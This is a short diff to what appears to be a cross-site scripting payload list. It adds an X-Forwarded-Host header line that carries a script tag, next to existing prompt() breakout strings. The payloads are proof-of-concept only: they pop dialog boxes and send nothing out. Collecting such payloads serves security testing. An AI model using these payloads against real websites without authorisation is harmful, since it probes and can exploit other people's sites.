@@ -31,7 +31,7 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 <!--        GitHub : https://github.com/ismailtasdelen/ -->
 <!--       Twitter : https://twitter.com/ismailtsdln -->
 <!--        Medium : https://medium.com/@ismailtasdelen -->
-
+X-Forwarded-Host: "><script>alert(document.domain)</script>
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
